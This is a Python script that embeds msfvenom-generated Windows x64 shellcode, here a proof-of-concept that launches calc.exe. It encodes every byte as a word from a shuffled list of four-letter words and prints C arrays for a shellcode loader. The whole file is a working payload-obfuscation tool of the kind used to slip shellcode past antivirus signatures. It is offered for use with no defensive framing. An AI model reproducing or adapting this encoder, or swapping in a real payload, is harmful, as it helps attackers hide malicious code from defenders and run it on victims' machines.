import random

# Shellcode generated by `msfvenom -p windows/x64/exec CMD=calc.exe -f py -v shellcode`
shellcode =  b""
shellcode += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41"
shellcode += b"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48"
shellcode += b"\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20"
shellcode += b"\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31"
shellcode += b"\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
shellcode += b"\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41"
shellcode += b"\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0"
shellcode += b"\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67"
shellcode += b"\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20"
shellcode += b"\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34"
shellcode += b"\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac"
shellcode += b"\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
shellcode += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
shellcode += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
shellcode += b"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
shellcode += b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a"
shellcode += b"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41"
shellcode += b"\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
shellcode += b"\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00"
shellcode += b"\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00"
shellcode += b"\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
shellcode += b"\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
shellcode += b"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
shellcode += b"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
shellcode += b"\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65"
shellcode += b"\x00"


def main():
    words = ['Ably', 'Afar', 'Area', 'Army', 'Away', 'Baby', 'Back', 'Ball', 'Band', 'Bank', 'Base', 'Bear', 'Beat', 'Bill', 'Body', 'Book', 'Burn', 'Call', 'Card', 'Care', 'Case', 'Cash', 'Cast', 'City', 'Club', 'Come', 'Cook', 'Cope', 'Cost', 'Damn', 'Dare', 'Date', 'Dead', 'Deal', 'Deep', 'Deny', 'Door', 'Down', 'Draw', 'Drop', 'Duly', 'Duty', 'Earn', 'East', 'Easy', 'Edge', 'Else', 'Even', 'Ever', 'Face', 'Fact', 'Fail', 'Fair', 'Fall', 'Farm', 'Fast', 'Fear', 'Feel', 'File', 'Fill', 'Film', 'Find', 'Fire', 'Firm', 'Fish', 'Flat', 'Food', 'Foot', 'Form', 'Full', 'Fund', 'Gain', 'Game', 'Girl', 'Give', 'Goal', 'Gold', 'Good', 'Grow', 'Hair', 'Half', 'Hall', 'Hand', 'Hang', 'Hard', 'Hate', 'Have', 'Head', 'Hear', 'Help', 'Here', 'Hide', 'High', 'Hold', 'Home', 'Hope', 'Hour', 'Hurt', 'Idea', 'Idly', 'Jack', 'John', 'Join', 'Jump', 'Just', 'Keep', 'Kill', 'Kind', 'King', 'Know', 'Lack', 'Lady', 'Land', 'Last', 'Late', 'Lead', 'Lend', 'Life', 'Lift', 'Like', 'Line', 'Link', 'List', 'Live', 'Long', 'Look', 'Lord', 'Lose', 'Loss', 'Loud', 'Love', 'Make', 'Mark', 'Mary', 'Meet', 'Mind', 'Miss', 'Move', 'Much', 'Must', 'Name', 'Near', 'Need', 'News', 'Nice', 'Note', 'Okay', 'Once', 'Only', 'Open', 'Over', 'Page', 'Pain', 'Pair', 'Park', 'Part', 'Pass', 'Past', 'Path', 'Paul', 'Pick', 'Plan', 'Play', 'Post', 'Pray', 'Pull', 'Push', 'Rain', 'Rate', 'Read', 'Real', 'Rely', 'Rest', 'Ride', 'Ring', 'Rise', 'Risk', 'Road', 'Rock', 'Role', 'Roll', 'Room', 'Rule', 'Sale', 'Save', 'Seat', 'Seek', 'Seem', 'Sell', 'Send', 'Shed', 'Shop', 'Show', 'Shut', 'Side', 'Sign', 'Sing', 'Site', 'Size', 'Skin', 'Slip', 'Slow', 'Solo', 'Soon', 'Sort', 'Star', 'Stay', 'Step', 'Stop', 'Suit', 'Sure', 'Take', 'Talk', 'Task', 'Team', 'Tell', 'Tend', 'Term', 'Test', 'Text', 'That', 'Then', 'This', 'Thus', 'Time', 'Tour', 'Town', 'Tree', 'Turn', 'Type', 'Unit', 'User', 'Vary', 'Very', 'View', 'Vote', 'Wait', 'Wake', 'Walk', 'Wall', 'Want', 'Warn', 'Wash', 'Wear', 'Week', 'When', 'Wide', 'Wife', 'Will', 'Wind', 'Wine', 'Wish', 'Wood', 'Word', 'Work', 'Year']
    random.shuffle(words)

    # Encode with words
    encoded_shellcode = "".join([words[x] + "\x00" for x in shellcode])

    # Output words
    print("const char* words[] = {")
    print("\t", end="")
    for i in range(len(words)):
        if i % 12 == 0 and i != 0:
            print("\n\t", end="")
        print(f"\"{words[i]}\"", end="")
        if i < len(words) - 1:
            print(", ", end="")
    print("\n};")

    print()

    # Output the encoded shellcode
    print("unsigned char encodedShellcode[] =")
    print("\t\"", end="")
    for i in range(len(encoded_shellcode)):
        if i % 12 == 0 and i != 0:
            print("\"\n\t\"", end="")
        print(f"\\x{ord(encoded_shellcode[i]):02x}", end="")
    print("\";")
    
    print()

    print(f"DWORD dwShellcodeSize = {len(shellcode)};")


if __name__ == '__main__':
    main()